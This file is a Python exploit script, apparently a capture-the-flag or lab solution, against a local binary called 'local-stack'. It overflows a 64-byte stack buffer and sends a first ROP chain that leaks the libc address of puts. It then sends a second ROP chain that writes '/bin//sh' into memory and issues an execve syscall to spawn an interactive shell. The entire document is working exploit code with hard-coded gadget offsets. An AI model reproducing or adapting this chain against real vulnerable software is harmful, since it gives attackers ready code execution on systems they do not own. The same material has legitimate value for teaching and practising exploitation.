#!/usr/bin/env python3
from struct import pack, unpack
from time import sleep
import pexpect
import tty
import termios

puts_offset = 0x809c0
main = pack('<Q', 0x400655)
execve = 59 #syscall num

pop_rdi = pack('<Q', 0x4006f3) #pop rdi; ret
puts_plt = pack('<Q', 0x4004e0)
puts_got = pack('<Q', 0x601018)

#rop chain to leak puts address
p = b'A'*64 #fill buffer
p += b'B'*8 #smash frame pointer
p += pop_rdi
p += puts_got
p += puts_plt
p += main #start over to get next stage & fix stack

#start address and set input type to raw
proc = pexpect.spawn('./local-stack')
inter = termios.tcgetattr(proc) #for returning to normal input
tty.setraw(proc)
proc.setecho(False) #don't want to hear myself

#skip junk
proc.expect('\n')
proc.expect('\n')

proc.sendline(p) #leak sploit
sleep(.1)

#more junk
proc.expect('@\n')
proc.expect('\n')

enc_addr = proc.before.ljust(8, b'\x00') #padding

#math to determine libc addr
puts_addr = unpack('<Q', enc_addr)[0]
libc_base = puts_addr - puts_offset
print("libc: " + hex(libc_base))

proc.expect('\n') #junk again
print(proc.before)
proc.expect('\n')
print(proc.before)

#shell generating rop chain
p = b'A'*64 #fill buffer
p += b'B'*8 #smash frame pointer
p += pack('<Q', libc_base+0x0000000000001b96) # pop rdx ; ret
p += pack('<Q', libc_base+0x00000000003eb1a0) # @ .data
p += pack('<Q', libc_base+0x00000000000439c8) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', libc_base+0x000000000003093c) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', libc_base+0x0000000000001b96) # pop rdx ; ret
p += pack('<Q', libc_base+0x00000000003eb1a8) # @ .data + 8
p += pack('<Q', libc_base+0x00000000000b17c5) # xor rax, rax ; ret
p += pack('<Q', libc_base+0x000000000003093c) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', libc_base+0x000000000002155f) # pop rdi ; ret
p += pack('<Q', libc_base+0x00000000003eb1a0) # @ .data
p += pack('<Q', libc_base+0x0000000000023e6a) # pop rsi ; ret
p += pack('<Q', libc_base+0x00000000003eb1a8) # @ .data + 8
p += pack('<Q', libc_base+0x0000000000001b96) # pop rdx ; ret
p += pack('<Q', libc_base+0x00000000003eb1a8) # @ .data + 8
p += pack('<Q', libc_base+0x00000000000b17c5) # xor rax, rax ; ret
p += execve*pack('<Q', libc_base+0x00000000000d0e00) # add rax, 1 ; ret
p += pack('<Q', libc_base+0x00000000000013c0) # syscall

proc.sendline(p) #send final payload
sleep(.1)
termios.tcsetattr(proc, termios.TCSADRAIN, inter) #restore normal input
proc.interact() #pwned
